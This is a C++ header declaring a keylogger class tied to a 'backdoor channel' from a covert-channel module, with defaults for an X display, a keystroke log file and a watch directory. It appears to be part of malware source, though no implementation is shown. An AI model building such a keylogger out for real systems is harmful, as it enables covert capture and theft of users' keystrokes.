#ifndef KEY_LOGGER_H
#define KEY_LOGGER_H

#include "../covert_channel/backdoor_channel.h"
#include <string>
using std::string;

class Key_Logger 
{
public:
    Key_Logger(Backdoor_Channel& bc) : backdoor_channel(bc) {};
    void start();

private:
    const char* WATCH_DIR = "/tmp";
    Backdoor_Channel& backdoor_channel;

    const char * DEFAULT_OUT_FILE  = "keystrokes.log";
    const char * DEFAULT_DISPLAY    = ":0";
    const bool   DEFAULT_PRINT_UP   = true;


};

#endif 
